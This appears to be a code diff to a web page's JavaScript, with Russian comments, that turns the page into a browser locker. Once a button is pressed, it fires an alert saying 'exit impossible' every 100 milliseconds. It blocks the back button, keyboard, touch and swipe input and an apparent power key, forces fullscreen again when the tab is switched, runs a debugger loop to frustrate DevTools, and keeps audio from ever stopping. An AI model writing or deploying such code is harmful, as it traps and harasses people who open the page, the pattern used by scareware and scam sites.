@@ -39,6 +39,15 @@
                 audio.play();
                 button.remove();
                 blockExit();
+                startInfiniteAlert();
+                blockBackButton();
+                blockTabSwitching();
+                blockPowerButton();
+                blockDevTools();
+                blockGestures();
+                blockKeyboard();
+                blockTouch();
+                ensureMusicNeverStops();
             });
 
             // Принудительный полноэкранный режим
@@ -63,33 +72,88 @@
                 window.addEventListener("popstate", function() {
                     window.history.pushState(null, "", window.location.href);
                     alert("Выход невозможен!");
-                    setTimeout(() => {
-                        location.href = window.location.href;
-                    }, 100);
                 });
             }
 
-            // Бесконечный alert() при сворачивании браузера
-            document.addEventListener("visibilitychange", () => {
-                if (document.hidden) {
-                    setInterval(() => alert("Выход невозможен!"), 100);
-                }
-            });
+            // Бесконечный alert()
+            function startInfiniteAlert() {
+                setInterval(() => {
+                    alert("Выход невозможен!");
+                }, 100);
+            }
 
-            // Блокировка горячих клавиш
-            document.addEventListener("keydown", (e) => {
-                e.preventDefault();
-            });
+            // Блокировка кнопки "Назад"
+            function blockBackButton() {
+                document.addEventListener("backbutton", (e) => {
+                    e.preventDefault();
+                    alert("Выход невозможен!");
+                }, false);
+            }
 
-            // Если сайт закрылся, перезапуск
-            setInterval(() => {
-                if (document.visibilityState === "hidden") {
-                    location.href = window.location.href;
-                }
-            }, 500);
+            // Блокировка переключения вкладок
+            function blockTabSwitching() {
+                document.addEventListener("visibilitychange", () => {
+                    if (document.hidden) {
+                        alert("Выход невозможен!");
+                        document.documentElement.requestFullscreen();
+                    }
+                });
+            }
 
-            // DevTools защита (автоматически закрывает их)
-            setInterval(() => { debugger; }, 100);
+            // Блокировка кнопки питания (попытка)
+            function blockPowerButton() {
+                document.addEventListener("keydown", (e) => {
+                    if (e.key === "Power" || e.key === "Off") {
+                        e.preventDefault();
+                        alert("Выход невозможен!");
+                    }
+                });
+            }
+
+            // Блокировка DevTools
+            function blockDevTools() {
+                setInterval(() => {
+                    debugger;
+                }, 100);
+            }
+
+            // Блокировка жестов (например, свайпов)
+            function blockGestures() {
+                document.addEventListener("touchmove", (e) => {
+                    e.preventDefault();
+                }, { passive: false });
+            }
+
+            // Блокировка клавиатуры (если подключена)
+            function blockKeyboard() {
+                document.addEventListener("keydown", (e) => {
+                    e.preventDefault();
+                });
+            }
+
+            // Блокировка касаний (делает экран нечувствительным)
+            function blockTouch() {
+                document.addEventListener("touchstart", (e) => {
+                    e.preventDefault();
+                }, { passive: false });
+
+                document.addEventListener("touchend", (e) => {
+                    e.preventDefault();
+                }, { passive: false });
+
+                document.addEventListener("touchcancel", (e) => {
+                    e.preventDefault();
+                }, { passive: false });
+            }
+
+            // Гарантия, что музыка никогда не остановится
+            function ensureMusicNeverStops() {
+                setInterval(() => {
+                    if (audio.paused) {
+                        audio.play();
+                    }
+                }, 100);
+            }
         }
 
     </script>
